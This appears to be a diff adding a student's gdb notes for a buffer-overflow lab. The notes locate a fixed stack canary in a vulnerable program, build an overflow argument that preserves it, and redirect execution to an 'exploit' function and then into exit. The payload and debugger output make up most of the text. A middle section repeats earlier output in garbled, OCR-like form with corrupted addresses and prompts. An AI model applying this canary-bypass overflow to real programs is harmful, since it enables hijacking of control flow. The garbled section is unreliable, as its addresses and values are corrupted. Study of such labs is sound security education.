@@ -1,0 +1,245 @@
+gdb --args ./lab1_1 suraj
+
+break main
+run
+
+break welcome 
+continue
+
+info r esp
+info r ebp
+
+ebp: 0xffffcfd8
+esp: 0xffffcfc0
+
+
+disassemble
+> movl   $0x55565758,-0xc(%ebp) % Set the canary
+> cmpl   $0x55565758,-0xc(%ebp) % Check for canary
+
+```python 
+>>> hex(0x55565758)
+1431721816
+```
+
+So the canary is stored at `-0xc(%ebp)` ? (0xc == 12)
+```
+>>> hex(0xffffcfd8 - 0xc)  # %ebp - 0xc
+'0xffffcfcc'
+>>> 0xffffcfc0 + 0xc
+4294954956
+>>> hex(0xffffcfc0 + 0xc) # % esp + 0xc
+'0xffffcfcc'
+>>> 
+
+```
+I want to print from esp to ebp and find the canary.
+
+
+```
+(gdb) x/16xg 0xffffcfc0
+0xffffcfc0:	0xffffd0e0ffffd0d4	*0x55565758*00000001
+0xffffcfd0:	0xffffd0d400000002	0x08048927ffffcff8
+0xffffcfe0:	0x00000060ffffd2d7	0x0000000200000000
+0xffffcff0:	0xffffd010080ea070	0x08048b6100000000
+0xffffd000:	0x00000060080ea00c	0x08048b6100000000
+0xffffd010:	0xffffd0d400000002	0xffffd034ffffd0e0
+0xffffd020:	0x0000000200000000	0x080488e1ffffd0d4
+0xffffd030:	0x080481a800000000	0x00000060080ea00c
+(gdb) 
+```
+
+```
+(gdb) x/1xw 0xffffcfcc
+0xffffcfcc:	0x55565758
+(gdb) 
+```
+
+
+break after the printf
+esp: 0xffffcfc0
+i.e. the same
+
+```
+(gdb) x/6s 0xffffcfc0
+0xffffcfc0:	"suraj"
+0xffffcfc6:	"\377\377\001"
+0xffffcfca:	""
+0xffffcfcb:	""
+0xffffcfcc:	"XWVU\002"
+0xffffcfd2:	""
+(gdb) 
+```
+
+So c0 has the start of the req string.
+So cc has the canary stored 
+(0xcc-0xc0) = 12, i.e. the size of the words
+
+```
+(gdb) bt
+#0  welcome (name=0xffffd2d7 "suraj") at lab1_1.c:20
+#1  0x08048927 in main (argc=2, argv=0xffffd0d4) at lab1_1.c:33
+(gdb) 
+```
+
+So cc has the canary stored
+[(oxcc-exce) = 12, i.e. the size of the words
+
+[(9db) x/16c oxFfffcfce
+
+oxfFffcfco: 115 's' 117 'u' 114 'r' 97 'a' 166 0 '\000" -1 \377
+Joxfffcfes: 1 "\eo1' © '\000" © '\000" 0 '\000" 88 'X
+v 85 'U
+
+(gdb)
+
+(gdb) bt
+
+20 welcome (name=oxffffd2d7 "suraj") at labi_1.c:26
+
+21 0x08048927 in main (argc=2, argv=0xffffded4) at labl_1.c:33
+(9db)
+
+[(9db) x/8xw oxFfffcfce
+loxffffcfco: 0x61727573 oxffffeesa 0x00000001 Bx55565758
+loxffffcfde: 0x00000002 oxffffded4 oxffffcffs 0x08048927
+
+: argc, argv[e], argv[1],
+
+INote this is little endian, so the order may be weird:
+
+[(9db) x/8xw oxFfffcfce
+loxffffcfco: 0x61727573 oxffffeesa 0x00000001 Bx55565758
+loxffffcfde: 0x00000002 oxffffded4 oxffffcffs 0x08048927
+
+Joxffffcfco: 0x7573 0x6172 0x006a OXFfff 0x0001 0x0000 O0X5758 OX5556
+Joxffffcfdo: 0x0002 0x0000 ©0xdodd4 OxXFFff Oxcff8 OXxFFff 0x8927 0x0804
+
+
+
+(gdb) info address main
+Symbol "main" is a function at address 0x80488e1.
+(gdb) info address welcome
+Symbol "welcome" is a function at address 0x8048895.
+(gdb) info address exploit
+Symbol "exploit" is a function at address 0x804887c.
+(gdb) 
+
+
+(gdb) x/16c 0xffffcfc0
+0xffffcfc0:	97 'a'	97 'a'	97 'a'	97 'a'	97 'a'	97 'a'	97 'a'	97 'a'
+0xffffcfc8:	97 'a'	97 'a'	97 'a'	0 '\000'	88 'X'	87 'W'	86 'V'	85 'U'
+(gdb) 
+
+0x804887c => 0x0804887c
+
+
+
+
+
+(gdb) break exploit
+Breakpoint 1 at 0x8048882: file lab1_1.c, line 8.
+(gdb) c
+The program is not being run.
+(gdb) r
+Starting program: /home/esctf/sse/assi1/lab1/lab1_1/lab1_1 aaaaaaaaaaaaXWVUbbbbbbbbbbbb\|�
+Welcome group aaaaaaaaaaaaXWVUbbbbbbbbbbbb|�, 	.
+
+Breakpoint 1, exploit () at lab1_1.c:8
+8		printf("Exploit succesfull...\n");
+(gdb) i r ebp
+ebp            0xffffcfac	0xffffcfac
+(gdb) i r esp
+esp            0xffffcfa4	0xffffcfa4
+(gdb) 
+
+
+break *exploit+22
+
+
+=> 0x08048892 <+22>:	nop
+   0x08048893 <+23>:	leave  
+   0x08048894 <+24>:	ret  
+
+
+leave:
+	mov   %ebp, %esp     # esp = ebp,  mov  esp,ebp in Intel syntax
+	pop   %ebp
+ret: 
+	0xffffcfa4 + 2 + 2
+
+
+
+(gdb) break welcome
+Breakpoint 2 at 0x804889b: file lab1_1.c, line 13.
+(gdb) run
+Starting program: /home/esctf/sse/assi1/lab1/lab1_1/lab1_1 aaaaaaaaaaaaXWVU\|�
+
+Breakpoint 2, welcome (
+    name=0xffffd2a4 'a' <repeats 12 times>, "XWVU", '\001' <repeats 12 times>, "|\210\004\b")
+    at lab1_1.c:13
+13		long canary= 1431721816;
+(gdb) info frame
+Stack level 0, frame at 0xffffcfb0:
+ eip = 0x804889b in welcome (lab1_1.c:13); saved eip = 0x8048927
+ called by frame at 0xffffcfe0
+ source language c.
+ Arglist at 0xffffcfa8, args: 
+    name=0xffffd2a4 'a' <repeats 12 times>, "XWVU", '\001' <repeats 12 times>, "|\210\004\b"
+ Locals at 0xffffcfa8, Previous frame's sp is 0xffffcfb0
+ Saved registers:
+  ebp at 0xffffcfa8, eip at 0xffffcfac
+(gdb) break exploit 
+Note: breakpoint 1 also set at pc 0x8048882.
+Breakpoint 3 at 0x8048882: file lab1_1.c, line 8.
+(gdb) c
+Continuing.
+Welcome group aaaaaaaaaaaaXWVU|�, 	.
+
+Breakpoint 1, exploit () at lab1_1.c:8
+8		printf("Exploit succesfull...\n");
+(gdb) info frame
+Stack level 0, frame at 0xffffcfb4:
+ eip = 0x8048882 in exploit (lab1_1.c:8); saved eip = 0xffffd200
+ called by frame at 0x1010109
+ source language c.
+ Arglist at 0xffffcfac, args: 
+ Locals at 0xffffcfac, Previous frame's sp is 0xffffcfb4
+ Saved registers:
+  ebp at 0xffffcfac, eip at 0xffffcfb0
+(gdb) 
+
+We need to change the value at 0xffffcfb0 to the lab1_1:34
+
+
+info line test.c:56
+
+
+(gdb) p exit
+$3 = {<text variable, no debug info>} 0x804e300 <exit>
+(gdb) 
+
+This has a `\0x00` in the middle of it, so the full address wont be copied.
+Checking the source code: 
+
+(gdb) x/5i 0x804e300
+   0x804e300 <exit>:	sub    $0x10,%esp
+   0x804e303 <exit+3>:	push   $0x1
+   0x804e305 <exit+5>:	push   $0x80ea070
+   0x804e30a <exit+10>:	pushl  0x1c(%esp)
+   0x804e30e <exit+14>:	call   0x804e1e0 <__run_exit_handlers>
+(gdb) 
+
+Shows that the first instruction can be skipped, and hence we give the return address as 0x0804e303
+
+EIP at 0xffffcfb0
+
+
+Core dump based 
+ulimit -c unlimited
+
+
+
+
+
+
